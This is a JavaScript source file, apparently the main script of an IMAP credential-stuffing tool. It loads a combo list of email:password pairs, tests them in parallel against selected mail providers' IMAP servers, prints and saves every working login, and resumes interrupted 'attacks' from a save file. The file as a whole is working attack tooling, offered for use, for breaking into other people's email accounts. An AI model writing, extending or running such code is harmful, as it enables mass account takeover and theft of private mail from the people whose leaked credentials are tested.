// dependencies

import 'babel-polyfill'
import colors from 'colors'
import hashFile from 'sha256-file'
import configs from './Imaps.js'
import os from 'os'
import * as Logger from './Logger.js'
import * as IO from './IO.js'
import * as Error from './Error.js'
import * as Prompt from './Prompt.js'
import * as Config from './Config.js'
import workerFarm from 'worker-farm'

const options = {
    maxCallsPerWorker: 1,
}

let workers = workerFarm(options, require.resolve('./Worker'))

let counter = 0
let selection, dictionary
var max, found, countTo
let unreachbleHost

max = 0
found = 0
countTo = 0

dictionary = null
unreachbleHost = false

const timedOut = () => {
    console.log(colors.red('[*] Authentification TIMED OUT...') + '\r')
    countTo++
    if (countTo >= 100) {
        console.log(colors.red('[*] Timed out too many times aborting attack!'))
        console.log(
            colors.red('[*] Current progress is ' + counter + ' / ' + max)
        )
        console.log(colors.red('[*] Found ' + found + ' working combo...'))
        process.exit()
    }
}

const connectThen = config => {
    found++
    Logger.clear()
    console.log(
        colors.green(
            '[*] ' +
                config.imap.user +
                ':' +
                config.imap.password +
                ' | ' +
                found +
                '/' +
                (counter + 1)
        )
    )
    IO.writeResult(config.imap.user + ':' + config.imap.password + os.EOL)
    forward()
}

const connectCatch = (error, config) => {
    Logger.clear()
    console.log(
        colors.red(
            '[*] ' +
                config.imap.user +
                ':' +
                config.imap.password +
                ' | ' +
                found +
                '/' +
                (counter + 1)
        )
    )
    if (error !== null) {
        console.log(colors.red(error.toString()) + '\r')
    }

    if (error.errno === -3008) unreachbleHost = true
    forward()
}
const connect = config => {
    // MAKING A SAVE IN CASE OF A TIMEOUT
    workers(config, function(err, config) {
        if (err) connectCatch(err, config)
        else connectThen(config)
    })
}

const forward = () => {
    counter++
    Logger.progressBar.increment()
}

const arrayCleaner = () => {
    const array = IO.getComboList(dictionary)
    let cleanArray = []

    for (const line in array)
        for (let i = 0; i < selection.length; i++)
            for (const id in configs[selection[i]].tag)
                if (array[line].includes(configs[selection[i]].tag[id])) {
                    max++
                    cleanArray.push(array[line])
                }
    return cleanArray
}
const main = async () => {
    let index = 0
    // READING SAVE FILE

    const saveData = IO.readSave()
    // CHECKING SAVE

    saveData.forEach(element => {
        if (
            JSON.stringify(element.host) === JSON.stringify(selection) &&
            element.hash === hashFile(dictionary)
        ) {
            found = element.found
            index = element.counter
            console.log(
                colors.green(
                    '[*] Save has been found!\n[*] Starting back the attack from ' +
                        new Date(element.timestamp).toLocaleString()
                )
            )
        }
    })

    // INITIALIZING LOOP
    counter = index
    const array = arrayCleaner()
    Logger.progressBar.start(max, index)
    // MAIN LOOP
    for (let i = index; i < array.length; i++) {
        let config = Config.get(array[i], selection)
        if (config) connect(config, i)
        if (unreachbleHost) break
    }

    workerFarm.end(workers, (error, output) => {
        console.log(error)
        console.log(output)
        onComplete()
    })
}

const selectFilePrompt = () => {
    Prompt.file()
        .then(output => {
            dictionary = output.path
            
            main()
        })
        .catch(error => {
            Error.badDictionary()
        })
}

const onComplete = () => {
    Logger.progressBar.stop()
    Logger.clear()
    if (unreachbleHost) {
        console.log(
            colors.white.bold(
                'Unable to perform target host might be down or your internet connectivity!'
            )
        )
        return
    }
    console.log(colors.white.bold('- IMAP Attack done -'))
    console.log(
        colors.white.bold('- Total Mail Tested: ' + max.toString() + ' -')
    )
    if (found > 0) IO.showResult(found)
    else
        console.log(
            colors.white.bold(
                '\nNothing found, try changing combolist or host :( ...\n'
            )
        )

    process.exit()
}

const selectHostPrompt = () => {
    Prompt.host()
        .then(array => {
            if (array.selection.length) {
                selection = array.selection
                selectFilePrompt()
            } else Error.noHost()
        })
        .catch(err => {
            console.error(err)
            process.exit(1)
        })
}

const onCleanup = () => {
    if (!dictionary) return
    var saveData = IO.readSave()
    var clean = []

    const session = {
        timestamp: +new Date(),
        hash: hashFile(dictionary),
        counter: counter,
        found: found,
        host: selection,
    }

    for (const key in saveData) {
        if (saveData.hasOwnProperty(key)) {
            const element = saveData[key]
            if (
                JSON.stringify(element.host) !== JSON.stringify(selection) ||
                element.hash !== hashFile(dictionary)
            )
                clean.push(element)
        }
    }

    clean.push(session)
    IO.writeSave(clean)
    //write SAVE FILE
}

const exitHandler = (options, exitCode) => {
    if (options.cleanup) onCleanup()
    if (options.exit) process.exit()
}

//do something when app is closing
process.on('exit', exitHandler.bind(null, { cleanup: true }))

//catches ctrl+c event
process.on('SIGINT', exitHandler.bind(null, { exit: true }))

// catches "kill pid" (for example: nodemon restart)
process.on('SIGUSR1', exitHandler.bind(null, { exit: true }))
process.on('SIGUSR2', exitHandler.bind(null, { exit: true }))

//catches uncaught exceptions
//process.on("uncaughtException", exitHandler.bind(null, { exit: true }));

IO.createSave() //create Save File
selectHostPrompt() // Start Wizard

process.stdin.resume() //so the program will not close instantly
